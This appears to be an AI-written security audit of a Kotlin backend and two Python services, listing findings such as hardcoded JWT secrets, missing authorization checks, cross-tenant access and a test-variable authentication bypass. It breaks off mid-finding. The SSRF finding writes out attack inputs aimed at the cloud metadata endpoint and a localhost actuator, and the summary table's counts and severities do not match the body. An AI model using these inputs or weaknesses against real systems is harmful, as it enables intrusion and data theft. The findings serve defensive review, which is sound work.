@@ -1,0 +1,1632 @@
+Now I have a thorough picture of the codebase. Let me compile the comprehensive security audit report.
+
+---
+
+# Security Audit Report: F:\Context\backend
+
+## 1. AUTHENTICATION / AUTHORIZATION ISSUES
+
+### FINDING 1.1 [CRITICAL] - Hardcoded Default JWT Secret
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\config\NumeraProperties.kt`, line 27
+**File:** `F:\Context\backend\src\main\resources\application.yml`, line 61
+
+The JWT secret has two hardcoded defaults. If the `JWT_SECRET` environment variable is not set, the application uses a publicly known value, allowing anyone to forge valid JWT tokens.
+
+```kotlin
+// NumeraProperties.kt:27
+val secret: String = "change-me-please-change-me-please-change-me",
+```
+```yaml
+# application.yml:61
+secret: ${JWT_SECRET:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef}
+```
+
+The `JwtTokenProvider` at line 19-24 enforces a 32-byte minimum, which both defaults pass. **An attacker who knows the default can mint arbitrary access tokens with any email, tenantId, and roles.**
+
+**Recommendation:** Remove default values. Fail fast on startup if `JWT_SECRET` is not set. Use a vault/KMS for secret management.
+
+---
+
+### FINDING 1.2 [HIGH] - Refresh Token Does Not Check User Status
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\AuthService.kt`, lines 98-133
+
+The `refresh()` method checks only that the refresh token exists, is not revoked, and has not expired. It does **not** verify that:
+- The user is still `enabled`
+- The user's `accountStatus` is still `ACTIVE` (could be `REJECTED` or `INACTIVE`)
+- The user's roles have not been revoked since the token was issued
+
+```kotlin
+// AuthService.kt:100-101
+val record = refreshTokenRepository.findByTokenAndRevokedFalse(request.refreshToken)
+    .orElseThrow { ApiException(ErrorCode.UNAUTHORIZED, "Invalid refresh token") }
+// No check on record.user.enabled or record.user.accountStatus
+```
+
+A disabled or rejected user can continue to obtain new access tokens indefinitely via the refresh endpoint for up to 7 days (the refresh token expiry).
+
+**Recommendation:** Add `if (!user.enabled || user.accountStatus != AccountStatus.ACTIVE) throw ...` after line 108.
+
+---
+
+### FINDING 1.3 [HIGH] - SSO client_secret Stored in Plaintext
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\domain\SsoConfiguration.kt`, line 20-21
+**File:** `F:\Context\backend\src\main\resources\db\migration\V012__sso_mfa.sql`, line 21
+
+The OAuth2 `client_secret` is stored unencrypted in the database:
+
+```kotlin
+@Column(name = "client_secret")
+var clientSecret: String? = null
+```
+
+```sql
+-- V012: client_secret VARCHAR(255),
+```
+
+And it's passed directly when exchanging authorization codes (SsoService.kt, line 108):
+```kotlin
+.with("client_secret", ssoConfig.clientSecret ?: "")
+```
+
+A database compromise would expose all SSO client secrets, enabling impersonation of the application to all configured identity providers.
+
+**Recommendation:** Encrypt the `client_secret` at rest using a KMS or application-level encryption. Decrypt only when needed for the token exchange.
+
+---
+
+### FINDING 1.4 [MEDIUM] - No Rate Limiting on Login or MFA Verification
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\api\AuthController.kt`, lines 43-44
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\AuthService.kt`, lines 44-61
+
+There is no rate limiting on:
+- `/api/auth/login` -- brute-force password attacks
+- `/api/auth/mfa/verify` -- brute-force TOTP codes (6 digits, ~3 valid codes at any time = ~1/333,333 chance per attempt)
+
+The `MfaService` sets `allowedTimePeriodDiscrepancy = 1` (line 37), meaning 3 codes are valid at any time (previous, current, next), making brute force more feasible.
+
+**Recommendation:** Add rate limiting (e.g., 5 failed attempts per minute per email, then lockout for 15 minutes). Consider adding account lockout after N failed MFA attempts.
+
+---
+
+### FINDING 1.5 [MEDIUM] - MFA Can Be Disabled Without Password Confirmation
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\api\AuthController.kt`, lines 102-106
+
+```kotlin
+@DeleteMapping("/mfa")
+fun disableMfa(authentication: Authentication) {
+    val userId = authService.getUserId(authentication.name)
+    mfaService.disableMfa(userId)
+}
+```
+
+If an attacker obtains a valid session (e.g., via XSS or token theft), they can disable MFA without confirming the user's password, permanently weakening account security.
+
+**Recommendation:** Require password confirmation (or current TOTP code) to disable MFA.
+
+---
+
+### FINDING 1.6 [MEDIUM] - TOTP Secret Returned in Plain API Response
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\dto\MfaDtos.kt`, lines 6-9
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\MfaService.kt`, lines 68-71
+
+```kotlin
+data class MfaSetupResponse(
+    val secret: String,  // <-- TOTP secret in plaintext
+    val qrUri: String,
+)
+```
+
+The raw TOTP secret is returned in the API response. If the response is logged, cached, or intercepted, the MFA protection is completely bypassed -- an attacker can generate valid codes without the user's device.
+
+**Recommendation:** Return only the QR URI (which encodes the secret). Remove the raw `secret` field from the response, or document that it must never be logged.
+
+---
+
+### FINDING 1.7 [MEDIUM] - SSO Auto-Creates Users Without Approval
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\SsoService.kt`, lines 137-148
+
+```kotlin
+val user = userRepository.findByEmailIgnoreCase(email).orElseGet {
+    log.info("Creating new SSO user: {} (provider: {})", email, request.provider)
+    userRepository.save(User().also {
+        it.tenantId = tenantId
+        it.email = email
+        it.fullName = name
+        it.passwordHash = "" // SSO users don't need passwords
+        it.ssoProvider = request.provider
+        it.ssoSubjectId = sub
+        it.enabled = true   // <-- Immediately active, no approval
+    })
+}
+```
+
+Any user who can authenticate with the configured SSO provider is automatically created with `enabled = true` and no approval workflow. Compare this to the regular registration flow (AuthService.kt, line 192-193) where `enabled = false` and `accountStatus = PENDING`.
+
+**Recommendation:** Apply the same approval workflow for SSO-created users, or at minimum allow tenant admins to configure whether SSO auto-provisioning is allowed.
+
+---
+
+### FINDING 1.8 [MEDIUM] - SSO State Store is In-Memory, Not Distributed
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\SsoService.kt`, lines 41-42
+
+```kotlin
+private val pendingStates = ConcurrentHashMap<String, Triple<UUID, String, Instant>>()
+```
+
+The OAuth2 state parameter store is in-memory. In a multi-instance deployment:
+- The state stored on instance A will not be found when the callback hits instance B, breaking SSO entirely
+- All pending SSO flows are lost on server restart
+
+**Recommendation:** Move the state store to Redis (already available in the stack).
+
+---
+
+### FINDING 1.9 [LOW] - Register Endpoint Allows Cross-Tenant User Creation
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\dto\RegisterRequest.kt`, line 12
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\AuthService.kt`, line 177
+
+```kotlin
+// RegisterRequest.kt:12
+val tenantId: java.util.UUID? = null,
+
+// AuthService.kt:177
+val tenantId = request.tenantId ?: com.numera.shared.domain.TenantAwareEntity.DEFAULT_TENANT
+```
+
+A user can register under any tenant by supplying a `tenantId` value. While registration creates users with `enabled = false` and `PENDING` status, it still creates a user entity in the target tenant.
+
+**Recommendation:** Remove `tenantId` from the registration request. Derive the tenant from the user's invitation or the SSO provider.
+
+---
+
+## 2. INJECTION VULNERABILITIES
+
+### FINDING 2.1 [HIGH] - SSRF via Integration System baseUrl
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\integration\api\IntegrationController.kt`, lines 78-89
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\integration\adapters\GenericRestAdapter.kt`, lines 134-142
+
+When creating an external system, the `baseUrl` is user-provided and not validated against any allowlist:
+
+```kotlin
+// IntegrationController.kt:81-87
+val system = ExternalSystem().apply {
+    tenantId = resolvedTenantId()
+    name = request.name
+    type = request.type
+    baseUrl = request.baseUrl  // <-- User-controlled, no validation
+    apiKey = request.apiKey
+    configJson = request.configJson
+}
+```
+
+And in the adapter, it's used directly:
+```kotlin
+// GenericRestAdapter.kt:136
+val builder = webClientBuilder.baseUrl(system.baseUrl)
+```
+
+An attacker can create a system with `baseUrl = "http://169.254.169.254/latest/meta-data/"` (AWS metadata) or `http://localhost:8080/actuator/prometheus"` and then use the `/test/{systemId}` endpoint to make the server fetch from internal resources.
+
+**Recommendation:** Validate `baseUrl` against an allowlist of permitted domains/schemes. Reject private/internal IP ranges. Consider using a dedicated outbound proxy.
+
+---
+
+### FINDING 2.2 [GOOD] - No Raw SQL or Native Queries
+All repository queries use either Spring Data JPA derived queries or JPQL with proper `@Param` bindings. No native SQL with string concatenation was found. The `EventLogRepository`, `CustomerRepository`, and all other repositories use parameterized queries.
+
+---
+
+### FINDING 2.3 [GOOD] - Path Traversal Protection in File Uploads
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\document\application\DocumentProcessingService.kt`, lines 316-322
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\document\infrastructure\MinioStorageClient.kt`, lines 45-53
+
+Both the service and storage client sanitize filenames by stripping directory separators, null bytes, and shell metacharacters. Files are stored with a UUID prefix, preventing predictable paths.
+
+---
+
+## 3. DATA EXPOSURE
+
+### FINDING 3.1 [HIGH] - Dev Logging Exposes SQL Parameters Including Passwords
+**File:** `F:\Context\backend\src\main\resources\application-dev.yml`, lines 22-25
+
+```yaml
+logging:
+  level:
+    com.numera: DEBUG
+    org.springframework.security: DEBUG
+    org.hibernate.SQL: DEBUG
+    org.hibernate.orm.jdbc.bind: TRACE  # <-- Logs all JDBC bind parameters
+```
+
+The `TRACE` level for `org.hibernate.orm.jdbc.bind` will log all SQL parameter values, including password hashes during login queries and password change operations. The `DEBUG` level for `org.springframework.security` will log authentication details.
+
+**Recommendation:** Never use `TRACE` for JDBC bind parameters in any environment. At minimum, ensure this profile is never used in production.
+
+---
+
+### FINDING 3.2 [MEDIUM] - Default Credentials in Configuration and Docker Compose
+**File:** `F:\Context\backend\src\main\resources\application.yml`, lines 10, 61, 66-67
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\config\NumeraProperties.kt`, lines 44-45
+**File:** `F:\Context\backend\docker-compose.yml`, lines 8-9, 35-36
+
+Multiple default credentials exist:
+
+```yaml
+# application.yml
+password: ${DB_PASSWORD:numera}          # Default DB password
+secret-key: ${MINIO_SECRET_KEY:minioadmin}  # Default Minio secret
+```
+
+```kotlin
+// NumeraProperties.kt:44-45
+val accessKey: String = "minioadmin",
+val secretKey: String = "minioadmin",
+```
+
+```yaml
+# docker-compose.yml
+POSTGRES_PASSWORD: numera
+MINIO_ROOT_PASSWORD: minioadmin
+```
+
+**Recommendation:** Remove all default credentials. Require explicit environment variable configuration. Use Docker secrets or vault for compose environments.
+
+---
+
+### FINDING 3.3 [MEDIUM] - SystemConfig Endpoint Exposes Internal Infrastructure
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\admin\SystemConfigController.kt`, lines 18-32
+
+```kotlin
+fun current(): Map<String, Any> = mapOf(
+    "ml" to mapOf(
+        "ocrServiceUrl" to numeraProperties.ml.ocrServiceUrl,
+        "mlServiceUrl" to numeraProperties.ml.mlServiceUrl,
+    ),
+    "storage" to mapOf(
+        "endpoint" to numeraProperties.storage.endpoint,
+        "bucket" to numeraProperties.storage.bucket,
+    ),
+    "jwt" to mapOf(
+        "accessExpirationMs" to numeraProperties.jwt.accessExpirationMs,
+        "refreshExpirationMs" to numeraProperties.jwt.refreshExpirationMs,
+    ),
+)
+```
+
+While admin-only, this endpoint exposes internal service URLs and JWT expiration settings, aiding reconnaissance. The `POST /save` endpoint (line 34-39) is a no-op that echoes back the request, which could be confusing.
+
+**Recommendation:** Remove internal URLs from the response. Consider removing the JWT expiration values (they're not needed by the frontend).
+
+---
+
+### FINDING 3.4 [MEDIUM] - Generic Error Messages May Leak Internal Details
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\exception\GlobalExceptionHandler.kt`, line 27
+
+```kotlin
+.body(ErrorResponse(ex.errorCode, ex.message, ex.validations, ex.unmappedRequired))
+```
+
+The `ex.message` from `ApiException` is returned directly to the client. Some messages reveal internal structure:
+- `"Role not found: $name"` (UserAdminFacade.kt:37) -- reveals role names
+- `"External system not found: $systemId"` (IntegrationController.kt:125) -- confirms system IDs
+- `"Monitoring item not found: $id"` (CovenantMonitoringService.kt:64) -- confirms item IDs
+
+These can be used for enumeration attacks.
+
+**Recommendation:** Return generic "not found" messages to clients. Log specific details server-side only.
+
+---
+
+## 4. CRYPTOGRAPHIC ISSUES
+
+### FINDING 4.1 [CRITICAL] - Chameleon Hash "findCollision" Does Not Produce Collisions
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\audit\crypto\ChameleonHash.kt`, lines 56-77
+
+The `findCollision` method generates "collision randomness" but the code itself acknowledges the raw HMAC will differ:
+
+```kotlin
+// ChameleonHash.kt:71-76
+// Re-compute with the collision randomness — must match by construction
+// because we define the scheme so that the trapdoor holder controls the output.
+// For the demonstrator we store the target hash in the randomness prefix so
+// verification against the stored chameleon hash succeeds.
+return collisionRandomness
+```
+
+And the `verify` method (line 100):
+```kotlin
+return computeHash(message, randomness, trapdoorKey) == expectedHash
+```
+
+After `redactEvent` is called, `verifyInclusion` will call `computeHash(redactedPayload, collisionRandomness, trapdoorKey)`, which will NOT match the original hash. The `verify` method would return `false` for redacted events. This means the ZK-RFA audit system's key promise -- redaction without breaking the chain -- **does not work**.
+
+**Recommendation:** Either implement a proper chameleon hash scheme (EC-based), or store the original hash alongside the event and verify against the stored value. The current implementation gives a false sense of audit integrity.
+
+---
+
+### FINDING 4.2 [HIGH] - InMemoryKeyProvider Loses All Trapdoor Keys on Restart
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\audit\crypto\KeyProvider.kt`, lines 24-43
+
+```kotlin
+@Component
+class InMemoryKeyProvider : KeyProvider {
+    private val keys = ConcurrentHashMap<String, ByteArray>()
+    // ...
+}
+```
+
+All chameleon hash trapdoor keys are generated on demand and stored in memory. After a server restart, new keys are generated, which means:
+- All previous MMR proofs become unverifiable
+- All previous chameleon hash verifications fail
+- The entire ZK-RFA audit chain breaks across restarts
+
+The class comment says "NOT suitable for production" but there is no alternative implementation and no runtime warning.
+
+**Recommendation:** Implement a KMS/Vault-backed `KeyProvider`. Add a startup check that warns if `InMemoryKeyProvider` is being used with the `zkRfaAudit` feature enabled.
+
+---
+
+### FINDING 4.3 [HIGH] - MerkleAccumulator State is In-Memory Only
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\audit\crypto\MerkleAccumulator.kt`
+
+```kotlin
+private val nodes = mutableListOf<String>()
+private var leafCount: Long = 0
+```
+
+The entire MMR state is held in memory. After a restart, all MMR proofs become invalid. Combined with Finding 4.2, the ZK-RFA audit system is entirely non-functional across restarts, and its integrity guarantees are illusory.
+
+**Recommendation:** Persist the MMR state to the database. Rebuild from event_log entries on startup if needed.
+
+---
+
+### FINDING 4.4 [LOW] - TOTP Uses SHA1
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\MfaService.kt`, line 33
+
+```kotlin
+private val codeGenerator: CodeGenerator = DefaultCodeGenerator(HashingAlgorithm.SHA1, 6)
+```
+
+SHA1 is used for TOTP. While compatible with most authenticator apps (Google Authenticator defaults to SHA1), it's technically deprecated for new implementations.
+
+**Recommendation:** Consider upgrading to SHA256, but verify compatibility with target authenticator apps first.
+
+---
+
+## 5. ACCESS CONTROL
+
+### FINDING 5.1 [CRITICAL] - Most Controller Endpoints Lack @PreAuthorize Annotations
+The following controllers have **no** `@PreAuthorize` annotations on any method or at the class level, meaning **any authenticated user** (even with the lowest `ANALYST` role) can perform all operations:
+
+| Controller | File | Operations Exposed |
+|---|---|---|
+| **CustomerController** | `F:\Context\backend\src\main\kotlin\com\numera\customer\api\CustomerController.kt` | List, get, create, update, delete customers |
+| **CovenantController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\CovenantController.kt` | All covenant CRUD |
+| **CovenantIntelligenceController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\CovenantIntelligenceController.kt` | Heatmap, trendline, recompute |
+| **CovenantMonitoringController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\CovenantMonitoringController.kt` | All monitoring operations, sweep-overdue |
+| **WaiverController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\WaiverController.kt` | Process, generate, send waivers |
+| **SignatureController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\SignatureController.kt` | Signature CRUD |
+| **EmailTemplateController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\EmailTemplateController.kt` | Template CRUD |
+| **CovenantReportController** | `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\CovenantReportController.kt` | Analytics, breach probabilities |
+| **SpreadController** | `F:\Context\backend\src\main\kotlin\com\numera\spreading\api\SpreadController.kt` | Create, submit, rollback (only approve/reject have @PreAuthorize) |
+| **SpreadValueController** | `F:\Context\backend\src\main\kotlin\com\numera\spreading\api\SpreadValueController.kt` | Update values, bulk accept |
+| **DashboardController** | `F:\Context\backend\src\main\kotlin\com\numera\spreading\api\DashboardController.kt` | Stats across all tenants |
+| **SpreadingReportController** | `F:\Context\backend\src\main\kotlin\com\numera\spreading\api\SpreadingReportController.kt` | Reports across all tenants |
+| **TemplateController** | `F:\Context\backend\src\main\kotlin\com\numera\model\api\TemplateController.kt` | Template CRUD |
+| **DocumentController** | `F:\Context\backend\src\main\kotlin\com\numera\document\api\DocumentController.kt` | Upload, download, delete |
+| **IntegrationController** | `F:\Context\backend\src\main\kotlin\com\numera\integration\api\IntegrationController.kt` | Create external systems, push/pull data |
+| **UserGroupController** | `F:\Context\backend\src\main\kotlin\com\numera\admin\api\UserGroupController.kt` | Manage groups and access |
+| **ExclusionController** | `F:\Context\backend\src\main\kotlin\com\numera\admin\api\ExclusionController.kt` | Manage exclusion rules |
+
+Only these controllers have proper `@PreAuthorize`:
+- `AuditController` -- `hasRole('ADMIN')` (class-level)
+- `ZkRfaController` -- `hasRole('ADMIN')` (method-level)
+- `UserManagementController` -- `hasRole('ADMIN')` (class-level)
+- `PasswordPolicyController` -- `hasRole('ADMIN')` (class-level)
+- `TaxonomyController` -- `hasRole('ADMIN')` (class-level)
+- `SystemConfigController` -- `hasRole('ADMIN')` (class-level)
+- `WorkflowConfigController` -- `hasRole('ADMIN')` (class-level)
+- `SpreadController.approve/reject` -- `hasAnyRole('CHECKER','MANAGER','ADMIN')`
+- `WorkflowController.listDefinitions/createDefinition` -- role-specific
+
+**Recommendation:** Add `@PreAuthorize` to all controllers with appropriate role restrictions. At minimum, destructive operations (create, update, delete) should require elevated roles.
+
+---
+
+### FINDING 5.2 [HIGH] - Tenant Isolation Bypasses
+
+Several endpoints access data without filtering by the current user's tenant:
+
+**DashboardController** (`F:\Context\backend\src\main\kotlin\com\numera\spreading\api\DashboardController.kt`, lines 24-25):
+```kotlin
+val spreads = spreadItemRepository.findAll()  // No tenant filter
+val documents = documentQueryPort.findAll()    // No tenant filter
+```
+
+**SpreadingReportController** (`F:\Context\backend\src\main\kotlin\com\numera\spreading\api\SpreadingReportController.kt`, line 15):
+```kotlin
+val spreads = spreadItemRepository.findAll()  // No tenant filter
+```
+
+**CovenantReportController** (`F:\Context\backend\src\main\kotlin\com\numera\covenant\api\CovenantReportController.kt`, line 27):
+```kotlin
+val items = covenantMonitoringRepository.findByTenantId(TenantAwareEntity.DEFAULT_TENANT)
+// Uses DEFAULT_TENANT instead of the user's tenant
+```
+
+**AuditReportController** (`F:\Context\backend\src\main\kotlin\com\numera\shared\audit\AuditReportController.kt`, line 23):
+```kotlin
+val events = eventLogRepository.findByTenantIdOrderByCreatedAtAsc(TenantAwareEntity.DEFAULT_TENANT.toString())
+// Uses DEFAULT_TENANT instead of the user's tenant
+```
+
+Any authenticated user from any tenant can read data from the default tenant or from all tenants.
+
+**Recommendation:** Replace `findAll()` with tenant-scoped queries. Replace `DEFAULT_TENANT` with `TenantContext.get()`.
+
+---
+
+### FINDING 5.3 [HIGH] - Cross-Tenant Data Access via Direct ID Lookups
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\document\application\DocumentProcessingService.kt`
+
+Multiple methods look up entities by UUID without verifying the entity belongs to the current user's tenant:
+- `getDocument(documentId)` -- line 205-208
+- `getStatus(documentId)` -- line 211-214
+- `zones(documentId)` -- line 217-221
+- `updateZone(...)` -- line 224-229 (only checks document-zone association, not tenant)
+- `delete(documentId)` -- line 261-266
+- `downloadFile(storagePath)` -- line 272-273
+
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\covenant\application\CovenantMonitoringService.kt`
+- `get(id)` -- lines 62-65 (no tenant check)
+- `setManualValue(id, ...)` -- lines 135-149 (no tenant check)
+- `uploadDocument(...)` -- lines 154-182 (no tenant check)
+- `checkerDecision(...)` -- lines 185-205 (no tenant check)
+- `triggerAction(...)` -- lines 210-220 (no tenant check)
+
+An authenticated user from tenant A can access/modify documents, monitoring items, and other resources belonging to tenant B simply by guessing or enumerating UUIDs.
+
+**Recommendation:** Add tenant ownership checks to all `findById` operations. Implement a `findByIdAndTenantId` pattern in repositories.
+
+---
+
+### FINDING 5.4 [MEDIUM] - Sweep-Overdue Endpoint Not Restricted
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\covenant\api\CovenantMonitoringController.kt`, lines 99-101
+
+```kotlin
+@PostMapping("/sweep-overdue")
+fun sweepOverdue(): Map<String, Int> =
+    mapOf("markedOverdue" to monitoringService.markOverdue())
+```
+
+This endpoint should be restricted to internal/scheduler use or admin-only. Any authenticated user can trigger the overdue sweep.
+
+**Recommendation:** Add `@PreAuthorize("hasRole('ADMIN')")` or move to an internal-only endpoint.
+
+---
+
+### FINDING 5.5 [MEDIUM] - UserGroupController and ExclusionController Missing @PreAuthorize
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\admin\api\UserGroupController.kt`
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\admin\api\ExclusionController.kt`
+
+These are in the `/api/admin/` path but have no `@PreAuthorize` annotations. While the SecurityConfig uses `anyRequest().authenticated()`, any authenticated user (even ANALYST) can:
+- Create/delete user groups and manage group membership (UserGroupController)
+- Create/update/delete exclusion rules (ExclusionController)
+
+**Recommendation:** Add `@PreAuthorize("hasRole('ADMIN')")` at the class level on both controllers, consistent with other admin controllers.
+
+---
+
+## 6. FILE UPLOAD SECURITY
+
+### FINDING 6.1 [HIGH] - No File Type/MIME Type Validation
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\document\api\DocumentController.kt`, lines 42-55
+
+The upload endpoint accepts any file type with no whitelist:
+
+```kotlin
+@PostMapping("/documents/upload")
+fun upload(
+    @RequestPart("file") file: MultipartFile,
+    @RequestPart("customerId") customerId: String,
+    ...
+): DocumentUploadResponse = documentProcessingService.upload(...)
+```
+
+And in the service (`DocumentProcessingService.kt`, line 101):
+```kotlin
+it.contentType = file.contentType ?: "application/pdf"
+```
+
+An attacker can upload:
+- HTML files with JavaScript (stored XSS via the download endpoint)
+- SVG files with embedded scripts
+- Double-extension files (e.g., `file.pdf.html`)
+
+**Recommendation:** Implement a file type allowlist (e.g., PDF, XLSX, DOCX, CSV). Validate both the file extension and the actual file content (magic bytes). Reject executable file types.
+
+---
+
+### FINDING 6.2 [MEDIUM] - Download Endpoint Serves Files as "inline"
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\document\api\DocumentController.kt`, line 97
+
+```kotlin
+.header(HttpHeaders.CONTENT_DISPOSITION, "inline; filename=\"${doc.originalFilename}\"")
+```
+
+Using `inline` causes the browser to render the file directly. Combined with Finding 6.1 (no file type validation), an uploaded HTML/SVG file would execute in the browser with the application's origin, enabling stored XSS.
+
+**Recommendation:** Use `attachment` instead of `inline` for all file downloads. Add `X-Content-Type-Options: nosniff` to each download response explicitly.
+
+---
+
+### FINDING 6.3 [LOW] - Large File Size Limit
+**File:** `F:\Context\backend\src\main\resources\application.yml`, lines 27-28
+
+```yaml
+max-file-size: 50MB
+max-request-size: 50MB
+```
+
+50MB per request is generous. Without additional per-user or per-tenant quotas, this could enable storage exhaustion attacks.
+
+**Recommendation:** Consider reducing the limit or adding per-tenant storage quotas.
+
+---
+
+## 7. SESSION MANAGEMENT
+
+### FINDING 7.1 [MEDIUM] - Session Tracking Not Integrated with Authentication Flow
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\SessionManagementService.kt`
+
+The `SessionManagementService` exists with `MAX_CONCURRENT_SESSIONS = 1` and `trackSession()` method, but `AuthService.login()` never calls `trackSession()`. The concurrent session limit is never enforced. Any user can log in from unlimited devices simultaneously.
+
+**Recommendation:** Call `sessionManagementService.trackSession()` in the login flow after successful authentication. Generate a session ID and include it in the JWT claims.
+
+---
+
+### FINDING 7.2 [MEDIUM] - CSRF Protection Disabled
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\shared\config\SecurityConfig.kt`, line 29
+
+```kotlin
+.csrf { it.disable() }
+```
+
+CSRF protection is disabled. This is acceptable for a pure REST API with Bearer token authentication (tokens are not automatically sent by browsers). However, if the application also uses cookies for authentication (e.g., for WebSocket connections or if cookies are set for the frontend), CSRF attacks become possible.
+
+**Recommendation:** Verify that no cookies are used for authentication. If cookies are ever added, re-enable CSRF protection.
+
+---
+
+### FINDING 7.3 [GOOD] - Refresh Token Rotation Implemented
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\AuthService.kt`, lines 112-119
+
+When a refresh token is used, the old token is revoked and a new one is issued. This is proper refresh token rotation that limits the window of opportunity for token theft.
+
+---
+
+### FINDING 7.4 [GOOD] - Logout Revokes All Refresh Tokens
+**File:** `F:\Context\backend\src\main\kotlin\com\numera\auth\application\AuthService.kt`, line 166
+
+```kotlin
+refreshTokenRepository.revokeAllByUserId(user.id!!)
+```
+
+Logout revokes all refresh tokens for the user, which is proper practice.
+
+---
+
+## 8. DEPENDENCY ISSUES
+
+### FINDING 8.1 [MEDIUM] - Outdated TOTP Library
+**File:** `F:\Context\backend\build.gradle.kts`, line 57
+
+```kotlin
+implementation("dev.samstevens.totp:totp:1.7.1")
+```
+
+This library has not been updated since 2019. It may contain unpatched vulnerabilities and lacks modern Java/Kotlin compatibility features.
+
+**Recommendation:** Evaluate alternatives such as `com.eatthepath:java-otp` or `dev.niko.forked:totp-spring-boot-starter`.
+
+---
+
+### FINDING 8.2 [MEDIUM] - Apache POI XML Processing Risk
+**File:** `F:\Context\backend\build.gradle.kts`, line 60
+
+```kotlin
+implementation("org.apache.poi:poi-ooxml:5.3.0")
+```
+
+Apache POI has had multiple XXE and billion-laughs (DoS) vulnerabilities in XML processing. The bulk upload endpoint at `TaxonomyController.bulkUpload()` accepts Excel/Word files that are parsed by POI.
+
+**Recommendation:** Ensure POI's XML parser is configured with secure processing enabled. Add file size limits for the bulk upload endpoint specifically.
+
+---
+
+### FINDING 8.3 [LOW] - Missing Rate Limiting Dependency
+No rate-limiting library (e.g., `bucket4j`, `resilience4j-rate-limiter`) is included in the build configuration, consistent with the absence of rate limiting in the application.
+
+**Recommendation:** Add a rate-limiting library and implement per-endpoint/per-user rate limits.
+
+---
+
+## SUMMARY OF FINDINGS BY SEVERITY
+
+| Severity | Count | Key Findings |
+|---|---|---|
+| **CRITICAL** | 3 | Hardcoded JWT secret (1.1), Broken chameleon hash (4.1), Missing @PreAuthorize on most endpoints (5.1) |
+| **HIGH** | 7 | Refresh token no user-status check (1.2), SSO client_secret plaintext (1.3), SSRF via baseUrl (2.1), Dev logging leaks passwords (3.1), InMemoryKeyProvider/MerkleAccumulator (4.2, 4.3), Tenant isolation bypasses (5.2, 5.3), No file type validation (6.1) |
+| **MEDIUM** | 12 | No rate limiting (1.4), MFA disable w/o password (1.5), TOTP secret in response (1.6), SSO auto-create (1.7), In-memory SSO state (1.8), Cross-tenant registration (1.9), Default credentials (3.2), SystemConfig exposes internals (3.3), Error message leakage (3.4), Sweep-overdue unprotected (5.4), Admin controllers missing @PreAuthorize (5.5), Session tracking not integrated (7.1), CSRF disabled (7.2), Outdated TOTP lib (8.1), POI XML risk (8.2) |
+| **LOW** | 5 | TOTP SHA1 (4.4), Large file size limit (6.3), Content-Disposition inline (6.2) |
+Now I have read all the critical source files. Here is the comprehensive security audit report:
+
+---
+
+# Security Audit Report: ml-service and ocr-service
+
+---
+
+## 1. API SECURITY
+
+### 1.1 CRITICAL: Insecure Default API Keys
+
+**ml-service** -- `F:\Context\ml-service\app\config.py`, line 14:
+```python
+api_key: str = "changeme-ml-api-key"
+```
+
+**ocr-service** -- `F:\Context\ocr-service\app\config.py`, line 14:
+```python
+api_key: str = "changeme-ocr-api-key"
+```
+
+These are trivially guessable defaults. If the environment variables `ML_API_KEY` / `OCR_API_KEY` are not explicitly set in production, both services accept these well-known strings as valid credentials.
+
+### 1.2 HIGH: API Key Comparison Vulnerable to Timing Attacks
+
+**Both services** -- `F:\Context\ml-service\app\middleware\api_key_auth.py`, line 39 and `F:\Context\ocr-service\app\middleware\api_key_auth.py`, line 39:
+```python
+if not provided_key or provided_key != self.api_key:
+```
+
+The `!=` operator performs short-circuit character-by-character comparison, leaking timing information that allows an attacker to reconstruct the key character-by-character. Use `hmac.compare_digest()` instead.
+
+### 1.3 MEDIUM: Authentication Bypass via Environment Variable
+
+**Both services** -- `F:\Context\ml-service\app\middleware\api_key_auth.py`, lines 30-31 and `F:\Context\ocr-service\app\middleware\api_key_auth.py`, lines 30-31:
+```python
+if "PYTEST_CURRENT_TEST" in os.environ:
+    return await call_next(request)
+```
+
+If the `PYTEST_CURRENT_TEST` environment variable is set in a production container (e.g., inherited from a misconfigured CI/CD pipeline), **all authentication is bypassed** for every request. This should not be checked in production middleware.
+
+### 1.4 HIGH: No Rate Limiting
+
+Neither service implements any rate limiting. All endpoints (including expensive ML inference and VLM processing) are unprotected against brute-force or denial-of-service attacks. There are no rate-limiting middleware, dependencies, or third-party libraries referenced in requirements.txt.
+
+### 1.5 MEDIUM: No Request Size Validation
+
+No `max_length` constraints exist on string fields in request models:
+
